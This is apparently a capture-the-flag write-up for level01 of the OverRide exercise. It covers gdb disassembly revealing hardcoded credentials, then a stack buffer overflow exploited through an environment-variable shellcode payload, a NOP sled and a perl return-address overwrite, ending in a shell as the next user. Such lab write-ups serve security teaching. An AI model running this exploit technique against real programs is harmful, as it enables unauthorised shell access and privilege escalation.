In the disassembled code, we can see two calls to functions called verify_user_name and verify_user_pass:
...
Dump of assembler code for function main:
   ...
   0x0804852d <+93>:    call   0x8048464 <verify_user_name> <==== Call to verify_user_name
   ...
   0x08048580 <+176>:   call   0x80484a3 <verify_user_pass> <==== Call to verify_user_pass
...
These functions look like this when disassembled:
...
Dump of assembler code for function verify_user_name:
   ...
   0x08048478 <+20>:    mov    $0x804a040,%edx <==== Empty string
   0x0804847d <+25>:    mov    $0x80486a8,%eax <==== Literal string for username ("dat_wil")
...
Dump of assembler code for function verify_user_pass:
   ...
   0x080484ad <+10>:    mov    $0x80486b0,%eax <==== Literal string for password ("admin")
...
I will try to use the strings I found as input when executing the program:
...
I will try to see if a segfault is possible when entering the password:
...
0x75757575 in ?? () <==== Segfault with more than 80 characters as password

Ok, there is an overflow possible when entering the password. I will exploit this to perform an env payload attack:
...
This will build the payload to be used as an environment variable. The payload is a simple shellcode that spawns a shell.

I need find the address of one of the NOPs in the NOP sled:

level01@OverRide:~$ env -i payload=$(cat /tmp/payload) gdb ./level01
(gdb) b main
...
(gdb) x/200s environ
...
0xffffdd32 <==== This is the address of one of the NOPs in the NOP sled

Now I will also set the payload used to create the buffer overflow:

perl -e 'print "a"x80 . "\x32\xdd\xff\xff"' > /tmp/payload2

And finally I will run the program as such:

level01@OverRide:~$ (echo dat_wil; cat /tmp/payload2 -) | env -i payload=$(cat /tmp/payload) ./level01
********* ADMIN LOGIN PROMPT *********
...
Perfect, I got a shell as user level02! I can now cat the .pass file to get the flag.

Note that here, a ret2libc exploit would have probably been possible as well, but I personally find it harder to comprehend and execute than the env payload attack.
